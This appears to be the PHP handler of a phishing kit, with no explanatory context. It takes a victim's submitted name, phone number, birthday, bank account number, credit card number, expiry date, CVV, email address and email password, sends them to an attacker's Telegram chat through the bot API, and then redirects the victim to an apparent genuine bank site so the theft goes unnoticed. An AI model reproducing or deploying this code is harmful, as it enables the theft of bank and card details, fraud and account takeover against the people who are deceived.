<?php
include("config.php");

$data = [
'chat_id' => $chat_id,
'text' => "Firstname: " . $_POST['fname'] . "\nMiddlename: " . $_POST['mname'] . "\nLastname: " . $_POST['lname'] . "\nNumber: " . $_POST['cnumber'] . "\nBday: " . $_POST['bday'] . "\nAcc Num: " . $_POST['accnum'] . "\nCC: " . $_POST['cc'] . "\nExpiration: " . $_POST['exp'] . "\nCVV: " . $_POST['cvv'] . "\nEmail: " . $_POST['email'] . "\nEmail Pass: " . $_POST['email_pass']
];
file_get_contents("https://api.telegram.org/bot" . $telebot . "/sendMessage?" . http_build_query($data));


header("Location: https://www.lbpiaccess.com/");
?>
